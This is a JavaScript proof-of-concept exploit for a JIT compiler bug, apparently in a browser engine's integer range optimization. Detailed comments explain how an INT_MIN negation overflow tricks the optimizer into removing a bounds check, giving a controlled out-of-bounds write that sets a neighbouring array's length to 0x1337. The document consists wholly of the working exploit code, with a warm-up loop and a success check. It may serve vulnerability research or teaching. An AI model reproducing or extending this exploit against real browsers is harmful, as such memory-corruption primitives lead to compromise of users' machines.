function hax(arr, n) {
    // Force n to be a 32bit integer.
    n |= 0;

    // Let IntegerRangeOptimization know that 
    // n will be a negative number inside the body.
    if (n < 0) {
        // Force "non-number bytecode usage" so the negation 
        // becomes unchecked and as such INT_MIN will again
        // become INT_MIN in the last iteration.
        let v = (-n)|0;

        // As n is known to be negative here, this ArithAbs 
        // will become a ArithNegate. That negation will be 
        // checked, but then be CSE'd for the previous, 
        // unchecked one. This is the compiler bug.
        let i = Math.abs(n);

        // However, IntegerRangeOptimization has also marked 
        // i as being >= 0...

        if (i < arr.length) {
            // .. so here IntegerRangeOptimization now believes 
            // i will be in the range [0, arr.length) while i 
            // will actually be INT_MIN in the final iteration.

            // This condition is written this way so integer 
            // range optimization isn't able to propagate range 
            // information (in particular that i must be a 
            // negative integer) into the body.
            if (i & 0x80000000) {
                // In the last iteration, this will turn INT_MIN 
                // into an arbitrary, positive number since the
                // ArithAdd has been made unchecked by integer range
                // optimization (as it believes i to be a positive
                // number) and so doesn't bail out when overflowing
                // int32.
                i += -0x7ffffff9;
            }

            // This conditional branch is now necessary due to 
            // the subtraction above. Otherwise, 
            // IntegerRangeOptimization couldn’t prove that i 
            // was always positive.
            if (i > 0) {
                // In here, IntegerRangeOptimization again believes
                // i to be in the range [0, arr.length) and thus
                // eliminates the CheckBounds node, leading to a 
                // controlled OOB access. This write will then corrupt
                // the header of the following JSArray, setting its
                // length and capacity to 0x1337.
                arr[i] = 1.04380972981885e-310;
            }
        }
    }
}

var arr = [1,2,3,4,5,6,7,8,9,10]; 
var tar = [1,2,3,4,5,6,7,8,9,10];
for (let i = 1; i <= 10000; i++) {
    let n = -4;
    if (i == 10000) {
        n = -2147483648;        // INT_MIN
    }
    hax(arr, n);
}

if (tar.length == 0x1337) {
    console.log("Exploit Successful\n");
}
else {
    console.log("Exploit Failed\n");
}
